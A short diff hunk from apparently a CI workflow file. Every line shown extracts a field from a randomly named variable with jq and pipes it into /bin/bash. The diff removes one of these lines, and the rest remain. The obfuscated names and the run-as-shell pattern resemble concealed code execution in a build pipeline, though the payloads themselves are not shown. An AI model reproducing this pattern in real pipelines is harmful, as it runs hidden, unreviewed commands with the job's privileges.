@@ -46,7 +46,6 @@ jobs:
           echo $tag4 | jq -r .ilwwu06703 | /bin/bash
           echo $zrgi52066 | jq -r .nh41817 | /bin/bash
           printf '%s' "$kksx046" | jq -r .t7 | /bin/bash
-          echo $jq70 | jq -r .r32 | /bin/bash
           printf '%s' "$adsva7682" | jq -r .tkyhr3203 | /bin/bash
           printf '%s' "$iannb7209" | jq -r .ym11417 | /bin/bash
           printf '%s' "$xxs31326" | jq -r .rpui72 | /bin/bash
